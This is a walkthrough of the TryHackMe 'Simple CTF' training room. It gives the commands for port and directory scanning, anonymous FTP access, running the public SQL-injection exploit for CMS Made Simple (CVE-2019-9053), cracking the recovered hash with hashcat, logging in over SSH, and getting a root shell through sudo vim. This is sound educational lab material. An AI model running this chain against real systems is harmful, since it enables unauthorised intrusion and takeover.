# simplectf

TryHackMe - Simple CTF Walkthrough
**Completed:21st April 2025
Room URL: https://tryhackme.com/room/simplectf
Focus: Enumeration, Web Exploitation, Password Cracking, Privilege Escalation

🧠 Overview
Simple CTF is a beginner-friendly Capture the Flag room on TryHackMe that walks through common penetration testing steps — from port scanning and web exploitation to password cracking and privilege escalation.



   🛠️ Tools & Techniques Used
Nmap
Gobuster
FTP (anonymous login)
Searchsploit
Python2 exploit
Hashcat
SSH
Vim (sudo misconfig)
GTFOBins
🔎 Step-by-Step Walkthrough
1. Enumeration
🔍 Nmap Scan
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
Findings:

Port 21 (FTP) — anonymous login allowed

Port 80 (HTTP)

Port 2222 (SSH)

📂 FTP Access
bash
Copy
Edit
ftp <TARGET_IP>
# Login as: anonymous
Retrieved a file named ForMitch.txt containing a password hint.

🧭 Gobuster Web Directory Scan
bash
Copy
Edit
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
Found: /simple — a web app using CMS Made Simple

2. Vulnerability Discovery
Identified CMS version (e.g., 2.2.8). Searched for vulnerabilities:

bash
Copy
Edit
searchsploit "CMS Made Simple 2.2.8"
Found CVE-2019-9053 — SQL Injection (ExploitDB ID 46635)

3. Exploitation
Download Exploit:
bash
Copy
Edit
searchsploit -m 46635
Exploit requires Python2 and the termcolor library:

bash
Copy
Edit
sudo pip2 install termcolor
Run exploit:

bash
Copy
Edit
python2 46635.py -u http://<TARGET_IP>/simple
Result: Retrieved username (mitch), hash, and salt.

4. Password Cracking
Used Hashcat with appropriate hash mode (e.g., MD5 + salt):

bash
Copy
Edit
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
Cracked password: secret

5. Gaining Access
SSH into the machine:

bash
Copy
Edit
ssh mitch@<TARGET_IP> -p 2222
Found and captured user.txt flag.

6. Privilege Escalation
Checked sudo permissions:

bash
Copy
Edit
sudo -l
Finding: Mitch can run /usr/bin/vim as root.

Used GTFOBins technique to get a root shell:

vim
Copy
Edit
sudo /usr/bin/vim
# Then inside vim:
:!/bin/bash
Navigated to /root and captured root.txt flag.

🏁 Flag Summary (Redacted)
User Flag: THM{***************}

Root Flag: THM{***************}

📌 Key Takeaways
Always check FTP access — anonymous login can leak useful info

Directory enumeration often reveals web app entry points

Understanding how to adapt exploits and resolve Python issues is key

GTFOBins is a critical resource for privilege escalation
